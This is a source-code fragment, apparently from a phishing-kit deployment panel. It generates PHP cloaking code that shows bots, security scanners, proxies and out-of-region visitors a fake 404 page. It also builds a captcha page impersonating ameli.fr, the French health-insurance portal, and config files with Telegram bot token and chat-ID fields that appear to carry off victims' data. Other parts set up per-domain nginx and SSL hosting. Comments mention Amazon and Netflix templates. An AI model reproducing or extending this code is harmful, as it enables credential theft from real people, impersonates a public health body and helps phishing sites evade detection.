if (!isset($mobile_only))       $mobile_only       = false;
if (!isset($ip_whitelist_raw))  $ip_whitelist_raw  = '';
if (!isset($ip_blacklist_raw))  $ip_blacklist_raw  = '';
if (!isset($isp_blacklist_raw)) $isp_blacklist_raw = '';
if (!isset($ua_blacklist_raw))  $ua_blacklist_raw  = '';
if (!isset($MotDePassePanel))   $MotDePassePanel   = '';

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
$_SESSION['bot'] = true;
$bot_reason = '';

// ── Session cache (30 min) → skip all checks ─────────────────
if (!empty($_SESSION['fw_authorized']) && is_array($_SESSION['fw_authorized'])) {
    if (time() - $_SESSION['fw_authorized']['ts'] < 1800) {
        $_SESSION['bot'] = false;
        goto fw_done;
    }
    unset($_SESSION['fw_authorized']);
}

// ── Captcha déjà passé → bypass ──────────────────────────────
if (!empty($_SESSION['captcha_passed'])) {
    $_SESSION['bot'] = false;
    goto fw_done;
}

// ── Firewall désactivé ($test_mode) → tout passe ─────────────
if ($test_mode) {
    $_SESSION['bot'] = false;
    goto fw_done;
}

// ── Session admin déjà authentifié ───────────────────────────
if (!empty($_SESSION['admin'])) {
    $_SESSION['bot'] = false;
    goto fw_done;
}

// ── Chargement des fichiers anti-bot ─────────────────────────
if (!function_exists('includeAllAntiFiles')) {
function includeAllAntiFiles($baseDir) {
    // Ameli/Amazon style : prevents/anti*.php
    $preventsDir = $baseDir . '/prevents';
    // Netflix style : antibots/all.php
    $antibotsDir = $baseDir . '/antibots';
    if (is_dir($preventsDir)) {
        $files = glob($preventsDir . '/anti[0-9]*.php');
        if ($files) {
            sort($files);
            foreach ($files as $f) include_once $f;
        }
    } elseif (is_dir($antibotsDir)) {
        $allFile = $antibotsDir . '/all.php';
        if (file_exists($allFile)) include_once $allFile;
    }
}
}
if ($anti_bot_enabled) {
    includeAllAntiFiles(dirname(__FILE__));
}

// ── Parse listes custom ──────────────────────────────────────
$ip_whitelist  = $ip_whitelist_raw  !== '' ? array_filter(array_map('trim', explode(',', $ip_whitelist_raw)))  : [];
$ip_blacklist  = $ip_blacklist_raw  !== '' ? array_filter(array_map('trim', explode(',', $ip_blacklist_raw)))  : [];
$isp_blacklist = $isp_blacklist_raw !== '' ? array_filter(array_map('trim', explode(',', $isp_blacklist_raw))) : [];
$ua_blacklist  = $ua_blacklist_raw  !== '' ? array_filter(array_map('trim', explode(',', $ua_blacklist_raw)))  : [];

// ── Mobile uniquement ────────────────────────────────────────
if ($mobile_only) {
    $ua = strtolower($_SESSION['ua']);
    if (!preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i', $ua)) {
        $bot_reason = 'Desktop non autorisé.';
        goto fw_block;
    }
}

// ── User-Agent vide ──────────────────────────────────────────
if ($block_empty_ua && empty(trim($_SESSION['ua']))) {
    $bot_reason = 'User-Agent vide.';
    goto fw_block;
}

// ── IP Whitelist → bypass ─────────────────────────────────────
if (!empty($ip_whitelist) && in_array($_SESSION['ip'], $ip_whitelist)) {
    $_SESSION['bot'] = false;
    goto fw_done;
}

// ── IP Blacklist → block immédiat ────────────────────────────
if (!empty($ip_blacklist) && in_array($_SESSION['ip'], $ip_blacklist)) {
    $bot_reason = 'IP blacklistée.';
    goto fw_block;
}

// ── User-Agent Blacklist ──────────────────────────────────────
if (!empty($ua_blacklist)) {
    $ua_lower = strtolower($_SESSION['ua']);
    foreach ($ua_blacklist as $pat) {
        if ($pat !== '' && stripos($ua_lower, strtolower($pat)) !== false) {
            $bot_reason = "User-Agent blacklisté : {$pat}";
            goto fw_block;
        }
    }
}

// ── ip-api + geo filtering (seulement si anti_bot_enabled) ──────
if ($anti_bot_enabled) {
    // Cache fichier IP-API (5 min) — évite d'appeler l'API à chaque requête
    $_fw_cache_path = sys_get_temp_dir() . '/fw_ip_' . md5($_SESSION['ip']) . '.json';
    $response = null;
    if (file_exists($_fw_cache_path) && (time() - filemtime($_fw_cache_path)) < 300) {
        $_fw_tmp = @file_get_contents($_fw_cache_path);
        if ($_fw_tmp) {
            $_fw_dec = @json_decode($_fw_tmp, true);
            if (is_array($_fw_dec) && ($_fw_dec['status'] ?? '') === 'success') {
                $response = $_fw_dec;
                goto fw_ip_cached;
            }
        }
    }

    $api_url = "http://ip-api.com/json/{$_SESSION['ip']}?fields=status,message,country,countryCode,city,zip,as,isp,mobile,proxy,hosting,query";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    $response_raw = curl_exec($ch);
    curl_close($ch);

    if ($response_raw === false || $response_raw === '') {
        $_SESSION['bot'] = false;
        goto fw_done;
    }

    $response = json_decode($response_raw, true);

    if (!$response || $response['status'] !== 'success') {
        $_SESSION['bot'] = false;
        goto fw_done;
    }

    @file_put_contents($_fw_cache_path, json_encode($response), LOCK_EX);

    fw_ip_cached:

    $_SESSION['ip_info'] = [
        'city'        => $response['city']        ?? '',
        'zip'         => $response['zip']         ?? '',
        'as'          => $response['as']          ?? '',
        'isp'         => $response['isp']         ?? '',
        'mobile'      => $response['mobile']      ?? false,
        'proxy'       => $response['proxy']       ?? false,
        'hosting'     => $response['hosting']     ?? false,
        'country'     => $response['country']     ?? '',
        'countryCode' => $response['countryCode'] ?? '',
    ];

    // ── ISP Blacklist custom ──────────────────────────────────
    if (!empty($isp_blacklist)) {
        $as_lower  = strtolower($_SESSION['ip_info']['as']);
        $isp_lower = strtolower($_SESSION['ip_info']['isp']);
        foreach ($isp_blacklist as $bl) {
            if ($bl !== '' && (stripos($as_lower, strtolower($bl)) !== false || stripos($isp_lower, strtolower($bl)) !== false)) {
                $bot_reason = "ISP blacklisté : {$bl}";
                goto fw_block;
            }
        }
    }

    // ── Pays + ISP whitelist ──────────────────────────────────
    $isp_list = [
        'free','bouygues','sfr','orange','sosh','red','la poste','laposte','wanadoo','nrj',
        'prixtel','coriolis','b&you','videofutur','numéricable','alice','dartybox',
        'a1 telekom austria ag','t-mobile austria gmbh','tele2 austria','hutchison drei austria gmbh',
        'aconet','kabelplus gmbh','salzburg ag fur energie, verkehr und telekommunikation',
        'liwest kabelmedien gmbh','technische universitat wien','vienna university computer center',
        'deutsche telekom global business solutions gmbh','apa-it informations technologie g.m.b.h',
        'next layer telekommunikationsdienstleistungs- und beratungs gmbh',
        'anexia internetdienstleistungs gmbh','video-broadcast gmbh','jm-data gmbh',
        'magistrat der stadt wien, magistratsabteilung 01','russmedia it gmbh','cancom austria ag',
        'swisscom (switzerland) ltd','switch','sunrise gmbh','green.ch ag',
        'cern - european organization for nuclear research','migros-genossenschafts-bund',
        'quickline ag','vtx services sa','hoffmann - la roche ltd.','post ch ag','iway ag',
        'zscaler switzerland gmbh','etat de geneve','swiss federation represented by foitt',
        'netplus.ch sa','centre informatique etat de fribourg','improware ag',
        'init7 (switzerland) ltd.','wwz telekom ag (telezug)','cyberlink ag',
        'telefónica chile s.a.','vtr banda ancha s.a.','telmex servicios empresariales s.a.',
        'entel chile s.a.','telefonica del sur s.a.','gtd internet s.a.','claro chile s.a.',
        'ctc. corp s.a. (telefonica empresas)','entel pcs telecomunicaciones s.a.',
        'telmex chile internet s.a.','telefonica movil de chile s.a.',
        'telefonica empresas chile sa','manquehuenet','red universitaria nacional',
        'codelco chuquicamata','universidad de santiago de chile',
        'pontificia universidad catolica de chile',
        'ministerio del interior y de seguridad publica - gobierno de chile',
        'universidad catholica de valparaiso',
        'telefonica de espana s.a.u.','orange espagne sa','vodafone espana s.a.u.',
        'vodafone ono, s.a.','rediris autonomous system','xtra telecom s.a.','euskaltel s.a.',
        'aire networks del mediterraneo sl unipersonal',
        'r cable y telecable telecomunicaciones, s.a.u.','digi spain telecom s.l.',
        'consorci de serveis universitaris de catalunya','avatel telecom, sa',
        'lyntia networks s.a.','adamo telecom iberia s.a.','telxius cable',
        'santander global technology, s.l.u','procono s.a.','acens technologies, s.l.','sarenet, s.a.',
        'orange s.a.','societe francaise du radiotelephone - sfr sa','free sas',
        'bouygues telecom sa','ovh sas','renater','free mobile sas','scaleway s.a.s.',
        'magyar telekom plc.','one hungary ltd.','digi tavkozlesi es szolgaltato kft.',
        'yettel hungary ltd.','invitech ict services kft.','tarr kft.','pr-telecom zrt.',
        '4ig telecommunications holding zrt','cetin hungary zrt.','vidanet cabletelevision provider ltd.',
        'opc networks kft.',
        'orange polska spolka akcyjna','p4 sp. z o.o.','netia sa','t-mobile polska s.a.',
        'multimedia polska sp. z o.o.','vectra s.a.','polkomtel sp. z o.o.','tk telekom sp. z o.o.',
        'exatel s.a.','home.pl s.a.','inea sp. z o.o.','toya sp.z.o.o','east & west sp. z o.o.',
        'meo - servicos de comunicacoes e multimedia s.a.','nos comunicacoes, s.a.',
        'vodafone portugal','edgoo networks','nos madeira comunicacoes, s.a.',
        'nowo communications, s.a.','onitelecom - infocomunicacoes, s.a.',
        'ar telecom - acessos e redes de telecomunicacoes, s.a.','nos acores comunicacoes, s.a.',
        'lazer telecomunicacoes s.a.',
        'talktalk communications limited','vodafone limited','plusnet',
        'colt technology services group limited','gamma telecom holdings ltd','zen internet ltd',
        'hutchison 3g uk limited','british telecommunications plc','entanet international limited',
        'mtn sa','dimension data','telkom sa ltd.','vodacom','cell c (pty) ltd',
        'liquid telecommunications south africa (pty) ltd','afrihost sp (pty) ltd',
        'rain group holdings (pty) ltd','vox telecom ltd','xneelo (pty) ltd','hero telecoms (pty) ltd',
    ];

    $allowed_countries = ['FR','CH','CL','ES','HU','PL','PT','GB','ZA'];

    if (!in_array($_SESSION['ip_info']['countryCode'], $allowed_countries)) {
        $bot_reason = "Pays non autorisé : " . $_SESSION['ip_info']['countryCode'];
        goto fw_block;
    }

    $found_isp = false;
    foreach ($isp_list as $isp_key) {
        if (stripos($_SESSION['ip_info']['as'], $isp_key) !== false || stripos($_SESSION['ip_info']['isp'], $isp_key) !== false) {
            $found_isp = true;
            $is_proxy   = $_SESSION['ip_info']['proxy']   && $block_proxy;
            $is_hosting = $_SESSION['ip_info']['hosting'] && $block_dc;
            if (!$is_proxy && !$is_hosting) {
                $_SESSION['bot'] = false;
            } else {
                $bot_reason = $is_proxy ? 'Proxy détecté.' : 'Hébergeur détecté.';
            }
            break;
        }
    }

    if (!$found_isp) {
        $bot_reason = "FAI non reconnu : " . $_SESSION['ip_info']['as'];
    }
} else {
    // Anti-bot désactivé → tout passe (custom lists déjà vérifiées)
    $_SESSION['bot'] = false;
}

goto fw_done;

// ── Block ─────────────────────────────────────────────────────
fw_block:
$_SESSION['bot'] = true;

fw_done:

// ── Mettre en cache session si autorisé ──────────────────────
if ($_SESSION['bot'] === false && empty($_SESSION['fw_authorized'])) {
    $_SESSION['fw_authorized'] = ['ts' => time()];
}

// ── Bypass mot de passe admin ────────────────────────────────
if (isset($_POST['admin_password']) && $MotDePassePanel !== '' && $_POST['admin_password'] === $MotDePassePanel) {
    $_SESSION['admin'] = true;
    $_SESSION['bot'] = false;
    header('Location: ' . $_SERVER['REQUEST_URI']);
    exit;
}

// ── Résultat final ────────────────────────────────────────────
if ($_SESSION['bot'] !== false) {
    http_response_code(404);
    echo "<!DOCTYPE html><html lang='fr'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>404 — Page introuvable</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a0f;color:#e2e4f0;min-height:100vh;display:flex;align-items:center;justify-content:center}body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(circle,rgba(255,255,255,0.04) 1px,transparent 1px);background-size:28px 28px;pointer-events:none}.wrap{text-align:center;padding:40px 24px;max-width:480px}.code{font-size:120px;font-weight:900;line-height:1;background:linear-gradient(135deg,#6d28d9,#2dd4bf);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:-.04em}.title{font-size:22px;font-weight:700;margin:16px 0 10px;letter-spacing:-.01em}.sub{font-size:14px;color:#6b6f8a;line-height:1.6}</style></head><body><div class='wrap'><div class='code'>404</div><div class='title'>Page introuvable</div><div class='sub'>La page que vous recherchez n'existe pas ou a été déplacée.</div></div></body></html>";
    exit;
}

// ── Captcha gate ──────────────────────────────────────────────
if (file_exists(__DIR__ . '/captcha.php')) include __DIR__ . '/captcha.php';
`;
}

function deployCaptchaPhp(templateId, pageDir) {
  const src = path.join(TEMPLATES_DIR, templateId || '', 'captcha.php');
  const dst = path.join(pageDir, 'captcha.php');
  if (fs.existsSync(src)) {
    fs.copyFileSync(src, dst);
  }
  // Copy template logo so captcha.php can reference it by relative path
  for (const ext of ['png', 'jpg', 'jpeg', 'webp', 'svg']) {
    const logoSrc = path.join(TEMPLATES_DIR, templateId || '', `logo.${ext}`);
    if (fs.existsSync(logoSrc)) {
      fs.copyFileSync(logoSrc, path.join(pageDir, `logo.${ext}`));
      break;
    }
  }
}

function deployRedirectFiles(templateId, pageDir) {
  const src = path.join(TEMPLATES_DIR, templateId || '', 'redirect');
  const dst = path.join(pageDir, 'redirect');
  if (fs.existsSync(src)) {
    copyDirSync(src, dst);
  }
}

function generateCaptchaPhp_UNUSED() {
  return `<?php
if (!isset($captcha_enabled)) $captcha_enabled = false;
if (!$captcha_enabled) return;

// Valider soumission
if (
    $_SERVER['REQUEST_METHOD'] === 'POST' &&
    isset($_POST['_cpt'], $_SESSION['_cpt_tok']) &&
    hash_equals($_SESSION['_cpt_tok'], $_POST['_cpt'])
) {
    $_SESSION['captcha_passed'] = true;
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Déjà validé → continuer
if (!empty($_SESSION['captcha_passed'])) return;

// Générer token une seule fois par session
if (empty($_SESSION['_cpt_tok'])) {
    $_SESSION['_cpt_tok'] = bin2hex(random_bytes(16));
}
$tok = htmlspecialchars($_SESSION['_cpt_tok'], ENT_QUOTES);

http_response_code(200);
echo <<<HTML
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ameli.fr – Vérification de sécurité</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f5f6fa;min-height:100vh;display:flex;flex-direction:column}

/* Header */
.header{background:#fff;border-bottom:1px solid #e0e0e0;padding:0 24px;height:64px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.header-logo{display:flex;align-items:center;gap:10px;text-decoration:none}
.ameli-logo{display:flex;align-items:center;gap:8px}
.ameli-logo-icon{width:42px;height:42px}
.ameli-logo-text{display:flex;flex-direction:column;line-height:1}
.ameli-logo-text .brand{font-size:22px;font-weight:700;color:#0072b9;letter-spacing:-.5px}
.ameli-logo-text .sub{font-size:9px;color:#666;letter-spacing:.3px;text-transform:uppercase;margin-top:1px}
.header-right{font-size:12px;color:#888;display:flex;align-items:center;gap:6px}
.header-right svg{width:14px;height:14px;color:#0072b9}

/* Breadcrumb */
.breadcrumb{background:#f0f4f8;border-bottom:1px solid #dde3ea;padding:8px 24px;font-size:12px;color:#666}
.breadcrumb a{color:#0072b9;text-decoration:none}
.breadcrumb span{margin:0 6px;color:#aaa}

/* Main */
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.08);width:100%;max-width:480px;overflow:hidden}
.card-header{background:#0072b9;padding:20px 24px;display:flex;align-items:center;gap:12px}
.card-header svg{width:28px;height:28px;flex-shrink:0}
.card-header-text .title{font-size:16px;font-weight:700;color:#fff}
.card-header-text .subtitle{font-size:12px;color:rgba(255,255,255,.8);margin-top:2px}
.card-body{padding:28px 24px}
.alert-info{background:#e8f4fd;border-left:4px solid #0072b9;border-radius:4px;padding:12px 14px;font-size:13px;color:#1a5276;margin-bottom:24px;line-height:1.5}
.alert-info strong{display:block;margin-bottom:2px;font-size:13.5px}
.verify-box{border:2px solid #e0e6ed;border-radius:8px;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:border-color .2s,background .2s;user-select:none;margin-bottom:20px}
.verify-box:hover{border-color:#0072b9;background:#f8fbff}
.verify-box.loading{border-color:#0072b9;background:#f0f7ff;cursor:default}
.verify-box.verified{border-color:#28a745;background:#f0fff4;cursor:default}
.verify-left{display:flex;align-items:center;gap:14px}
.cb{width:24px;height:24px;border:2px solid #b0bec5;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:#fff;transition:all .2s}
.verify-box.loading .cb{border-color:#0072b9}
.verify-box.verified .cb{border-color:#28a745;background:#28a745}
.spin{display:none;width:14px;height:14px;border:2px solid #bdd8f0;border-top-color:#0072b9;border-radius:50%;animation:spin .7s linear infinite}
.chk{display:none}
.verify-box.loading .spin{display:block}
.verify-box.verified .chk{display:block}
@keyframes spin{to{transform:rotate(360deg)}}
.verify-label{font-size:14px;color:#2c3e50;font-weight:500}
.verify-label small{display:block;font-size:11px;color:#7f8c8d;font-weight:400;margin-top:2px}
.verify-badge{display:flex;flex-direction:column;align-items:center;gap:3px;flex-shrink:0}
.badge-shield{width:32px;height:32px}
.badge-text{font-size:8px;color:#95a5a6;font-weight:600;letter-spacing:.3px;text-align:center}
.status-msg{font-size:12.5px;text-align:center;color:#7f8c8d;line-height:1.5}
.status-msg.ok{color:#1e8449}

/* Footer */
.footer{background:#fff;border-top:1px solid #e0e0e0;padding:14px 24px;text-align:center;font-size:11px;color:#aaa}
.footer a{color:#aaa;text-decoration:none;margin:0 8px}
</style>
</head>
<body>

<div class="header">
  <div class="header-logo">
    <div class="ameli-logo">
      <svg class="ameli-logo-icon" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
        <rect width="120" height="120" rx="16" fill="#0072b9"/>
        <path d="M60 20 C60 20 35 30 35 55 C35 72 46 83 60 90 C74 83 85 72 85 55 C85 30 60 20 60 20Z" fill="none" stroke="#fff" stroke-width="5"/>
        <circle cx="60" cy="46" r="10" fill="#fff"/>
        <path d="M44 78 Q52 65 60 62 Q68 65 76 78" fill="#fff"/>
      </svg>
      <div class="ameli-logo-text">
        <span class="brand">ameli</span>
        <span class="sub">Assurance Maladie</span>
      </div>
    </div>
  </div>
  <div class="header-right">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
    Connexion sécurisée
  </div>
</div>

<div class="breadcrumb">
  <a href="#">Accueil</a><span>›</span><a href="#">Mon compte</a><span>›</span>Vérification de sécurité
</div>

<div class="main">
  <div class="card">
    <div class="card-header">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      <div class="card-header-text">
        <div class="title">Vérification de sécurité</div>
        <div class="subtitle">Étape obligatoire pour accéder à votre espace</div>
      </div>
    </div>
    <div class="card-body">
      <div class="alert-info">
        <strong>Pourquoi cette vérification ?</strong>
        Afin de protéger votre compte et vos données personnelles, l'Assurance Maladie vérifie que vous êtes bien un utilisateur humain.
      </div>

      <div class="verify-box" id="vbox" onclick="doVerify()" role="checkbox" aria-checked="false" tabindex="0">
        <div class="verify-left">
          <div class="cb">
            <div class="spin"></div>
            <div class="chk">
              <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
                <polyline points="1.5,6.5 5,10 11.5,2.5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </div>
          </div>
          <div class="verify-label">
            Je confirme ne pas être un robot
            <small id="vlabel">Cliquez pour valider votre accès</small>
          </div>
        </div>
        <div class="verify-badge">
          <svg class="badge-shield" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M24 4L8 10V22C8 31.9 15.2 41.1 24 44C32.8 41.1 40 31.9 40 22V10L24 4Z" fill="#e8f4fd" stroke="#0072b9" stroke-width="2"/>
            <path d="M18 24l4 4 8-8" stroke="#0072b9" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          <div class="badge-text">SÉCURISÉ<br>SSL</div>
        </div>
      </div>

      <div class="status-msg" id="smsg">
        Vérification assurée par le système de sécurité ameli.fr
      </div>
    </div>
  </div>
</div>

<div class="footer">
  <a href="#">Mentions légales</a>
  <a href="#">Politique de confidentialité</a>
  <a href="#">Accessibilité</a>
  <a href="#">Contact</a>
  <br><br>© 2025 Assurance Maladie – ameli.fr
</div>

<form method="post" id="vform" style="display:none">
  <input type="hidden" name="_cpt" value="{$tok}">
</form>
<script>
function doVerify(){
  var b=document.getElementById('vbox');
  if(b.classList.contains('loading')||b.classList.contains('verified'))return;
  b.classList.add('loading');
  b.setAttribute('aria-checked','true');
  document.getElementById('vlabel').textContent='Vérification en cours…';
  document.getElementById('smsg').textContent='Analyse de sécurité en cours, veuillez patienter…';
  var d=1200+Math.floor(Math.random()*800);
  setTimeout(function(){
    b.classList.remove('loading');
    b.classList.add('verified');
    document.getElementById('vlabel').textContent='Vérification réussie';
    var s=document.getElementById('smsg');
    s.textContent='Accès autorisé. Redirection vers votre espace…';
    s.className='status-msg ok';
    setTimeout(function(){document.getElementById('vform').submit();},500);
  },d);
}
document.getElementById('vbox').addEventListener('keydown',function(e){
  if(e.key===' '||e.key==='Enter'){e.preventDefault();doVerify();}
});
</script>
</body>
</html>
HTML;
exit;
`;
}

function generateFirewallConfigPhp(fw = {}) {
  const bool = v => v ? 'true' : 'false';
  const list = arr => (Array.isArray(arr) ? arr : []).join(', ')
    .replace(/\\/g, '\\\\')  // backslashes en premier
    .replace(/'/g, "\\'");   // puis apostrophes
  const fwOn = fw['fw-master-toggle'] !== false;
  return `<?php
$test_mode         = ${bool(!fwOn)};
$anti_bot_enabled  = ${bool(fw['fw-anti-bot']      !== false)};
$block_proxy       = ${bool(fw['fw-block-proxy']    !== false)};
$block_vpn         = ${bool(fw['fw-block-vpn'])};
$block_tor         = ${bool(fw['fw-block-tor']      !== false)};
$block_dc          = ${bool(fw['fw-block-dc']       !== false)};
$block_empty_ua    = ${bool(fw['fw-block-ua']       !== false)};
$mobile_only       = ${bool(fw['fw-mobile-only'])};
$ip_whitelist_raw  = '${list(fw['ip-wl'])}';
$ip_blacklist_raw  = '${list(fw['ip-bl'])}';
$isp_blacklist_raw = '${list(fw.isp)}';
$ua_blacklist_raw  = '${list(fw.ua || ['bot','crawler','spider','scraper'])}';
`;
}

function generateConfigPhp(cfg, schema, pageId, templateId) {
  const esc = s => String(s ?? '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");

  const trackSnippet = pageId ? `
// ── Auto-tracker ──────────────────────────────────────────────
if (!defined('_TRACKER_PAGE_ID_')) define('_TRACKER_PAGE_ID_', '${pageId}');
if (!defined('_TRACKER_URL_')) define('_TRACKER_URL_', 'http://127.0.0.1:${config.server.port}/api/track/${pageId}');
if (!function_exists('_tracker_fire_')) {
function _tracker_fire_($event) {
  if (!function_exists('curl_init')) return;
  $ch = @curl_init(_TRACKER_URL_);
  if (!$ch) return;
  @curl_setopt_array($ch, [CURLOPT_POST=>1, CURLOPT_POSTFIELDS=>json_encode(['e'=>$event,'ip'=>$_SERVER['REMOTE_ADDR']??'','ua'=>$_SERVER['HTTP_USER_AGENT']??'']), CURLOPT_HTTPHEADER=>['Content-Type: application/json'], CURLOPT_TIMEOUT_MS=>300, CURLOPT_RETURNTRANSFER=>1, CURLOPT_NOSIGNAL=>1]);
  @curl_exec($ch); @curl_close($ch);
}
}
if (isset($_SERVER['REQUEST_METHOD']) && !defined('_TRACKER_INIT_')) {
  define('_TRACKER_INIT_', true);
  $__self = basename($_SERVER['PHP_SELF'] ?? '');
  if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!isset($_SESSION['_trk_v'])) { $_SESSION['_trk_v'] = 1; _tracker_fire_('view'); }
    _tracker_fire_('hb');
  } elseif ($__self === 'click.php') {
    _tracker_fire_('click');
  }
  register_shutdown_function(function() {
    if (isset($_SESSION['bot']) && $_SESSION['bot'] === true) _tracker_fire_('blocked');
  });
}
` : '';

  /* Template-based: lire config.php du template et remplacer les placeholders */
  if (templateId) {
    const tplConfigPath = path.join(TEMPLATES_DIR, templateId, 'config.php');
    if (fs.existsSync(tplConfigPath)) {
      let content = fs.readFileSync(tplConfigPath, 'utf8');
      if (Array.isArray(schema)) {
        for (const field of schema) {
          if (!field.phpVar) continue;
          const val = cfg[field.key] !== undefined ? cfg[field.key] : (field.default ?? '');
          const phpVar = field.phpVar; // ex: '%TG_TOKEN%' ou '$bot_token'

          if (phpVar.startsWith('%') && phpVar.endsWith('%')) {
            // Format Ameli: %PLACEHOLDER% — remplacer directement dans le fichier
            const escaped = RegExp.escape ? RegExp.escape(phpVar) : phpVar.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            if (field.type === 'toggle') {
              content = content.replace(new RegExp(escaped, 'g'), val ? 'true' : 'false');
            } else {
              content = content.replace(new RegExp(escaped, 'g'), esc(String(val)));
            }
          } else {
            // Format Netflix: '$varName' dans return array()
            const varName = phpVar.replace(/^\$/, '');
            const escaped = esc(String(val));
            content = content.replace(new RegExp(`'\\$${varName}'`, 'g'), `'${escaped}'`);
          }
        }
      }
      // Injecter le tracker AVANT le return array() pour qu'il s'exécute
      content = content.replace(/\?>\s*$/, '').trimEnd();
      if (trackSnippet && /^\s*return\s+(array\s*\(|\[)/m.test(content)) {
        content = content.replace(/(\r?\n\s*return\s+(array\s*\(|\[))/m, '\n' + trackSnippet + '$1');
      } else {
        content = content + '\n' + trackSnippet;
      }
      return content;
    }
  }

  /* Schema-based generation (fallback si pas de config.php template) */
  if (Array.isArray(schema) && schema.length) {
    const lines = ['<?php'];
    for (const field of schema) {
      if (!field.phpVar) continue;
      const varName = field.phpVar.replace(/^\$/, '');
      const val = cfg[field.key] !== undefined ? cfg[field.key] : (field.default ?? '');
      if (field.type === 'toggle') {
        lines.push(`$${varName} = ${val ? 'true' : 'false'};`);
      } else {
        lines.push(`$${varName} = '${esc(val)}';`);
      }
    }
    return lines.join('\n') + '\n' + trackSnippet;
  }

  /* Legacy fallback (templates sans schema) */
  const token  = esc(cfg.tgToken  || '');
  const chatid = esc(cfg.tgChatId || '');
  return `<?php\ndefine('TG_TOKEN',        '${token}');\ndefine('TG_CHAT_ID',      '${chatid}');\ndefine('CAPTCHA_ENABLED', ${cfg.captcha  ? 'true' : 'false'});\ndefine('OTP_MODE',        ${cfg.applepay ? 'true' : 'false'});\n` + trackSnippet;
}

function readPagesMap() {
  try { return JSON.parse(fs.readFileSync(PAGES_MAP_JSON, 'utf8')); } catch { return {}; }
}

function writePagesMap(map) {
  const DOMAIN_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$/i;
  const tmp = PAGES_MAP_JSON + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(map, null, 2));
  fs.renameSync(tmp, PAGES_MAP_JSON);
  const lines = Object.entries(map)
    .filter(([host]) => DOMAIN_RE.test(host))  // rejette tout domaine invalide
    .map(([host, dir]) => `  ${host} ${dir};`).join('\n');
  fs.writeFileSync(NGINX_MAP_FILE, lines ? lines + '\n' : '');
}

function reloadNginx() {
  exec('sudo /usr/sbin/nginx -s reload', (err) => {
    if (err) console.error('[nginx/reload] ✗', err.message);
    else     console.log('[nginx/reload] ✓ rechargé');
  });
}

/* ── SSL / Certbot ──────────────────────────────────────────── */
const CF_ORIGIN_DIR = '/etc/ssl/cf-origin';

function domainNginxConfPath(domain) {
  const safe = domain.replace(/[^a-z0-9.-]/gi, '');
  return path.join(config.certbot.nginxConfDir, `dontplay-page-${safe}.conf`);
}

/* opts.certPath / opts.keyPath : chemins custom (CF Origin Cert)
   opts.skipLeSslParams         : utiliser ssl_protocols/ciphers inline au lieu de letsencrypt includes */
function writeDomainSslConf(domain, pageDir, opts = {}) {
  const DOMAIN_RE = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$/i;
  if (!DOMAIN_RE.test(domain)) throw new Error(`Domaine invalide pour nginx conf : ${domain}`);
  const cert     = config.certbot;
  const certFile = opts.certPath || `/etc/letsencrypt/live/${domain}/fullchain.pem`;
  const keyFile  = opts.keyPath  || `/etc/letsencrypt/live/${domain}/privkey.pem`;
  const sslExtra = opts.skipLeSslParams
    ? [
        `  ssl_protocols TLSv1.2 TLSv1.3;`,
        `  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256;`,
        `  ssl_prefer_server_ciphers off;`,
      ]
    : [
        `  include ${cert.sslParamsFile};`,
        `  ssl_dhparam ${cert.dhparamFile};`,
      ];
  const lines = [
    `# HTTP → HTTPS redirect pour ${domain}`,
    `server {`,
    `  listen 80;`,
    `  server_name ${domain};`,
    `  location /.well-known/acme-challenge/ { root ${cert.webroot}; }`,
    `  location / { return 301 https://$host$request_uri; }`,
    `}`,
    `server {`,
    `  listen 443 ssl;`,
    `  server_name ${domain};`,
    `  ssl_certificate     ${certFile};`,
